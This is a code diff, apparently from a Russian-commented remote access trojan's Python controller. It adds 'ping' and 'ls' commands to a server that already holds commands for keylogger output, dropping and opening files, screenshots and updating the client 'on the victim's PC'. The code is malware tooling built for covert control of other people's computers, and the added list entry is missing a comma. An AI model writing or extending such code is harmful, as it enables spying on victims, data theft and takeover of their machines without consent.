@@ -1,4 +1,4 @@
-import socket, json, base64
+import socket, json, base64, time
 
 # Список команд с описанием, в виде 2д массива
 commands_en = [
@@ -29,6 +29,8 @@ commands = [
     ["drop", "отправляет файл из телеграма и открывает его на клиенте"],
     ["clires", "перезапускает скрипт клиента"],
     ["keylogger", "возвращает клавиши собранные кейлогером"],
+    ["ping", "показывает задержку в подключении с клиентом"],
+    ["ls", "показывает содержимое папки"]
     ["отправить новый файл клиента с комментарием update", "обновляет приложение клиент на пк жертвы"]
 ]
 
@@ -116,9 +118,10 @@ class ManyServers:
         else:
             command = command.split()[1:]
             res = self.__servers_ips[tag][1].step(command)
-            if res == "соединение закрыто":
+            if res == "Клиент отключен -_-":
                 self.__servers_ips.pop(tag)
                 self.__servers_count.pop(int(tag))
+                res = "соеденение закрыто"
             return res
 
 
@@ -142,6 +145,10 @@ class Server:
             if command[0] in ["upload", "drop", "update_client"]:
                 fileContent = self.__readFile(command[1]).decode()
                 command.append(fileContent)
+            elif command[0] == "ping":
+                start_ping_time: float = time.time()
+            elif command[0] == "ls":
+                command[0] = "dir"
             result = self.__executeRemotely(command)
             if command[0] == "download" and "[-] Error" not in result:
                 result = self.__writeFile(command[1], result)
@@ -149,8 +156,10 @@ class Server:
                 result = self.__screenshot(result)
             elif command[0] == "ratHelp":
                 result = help_command()
+            elif command[0] == "ping":
+                return time.time() - start_ping_time
             elif command[0] == "clires":
-                return "соединение закрыто"
+                return "Клиент отключен -_-"
         except Exception:
             result = "ошибка выполнения команды, проверьте синтаксис"
         return result
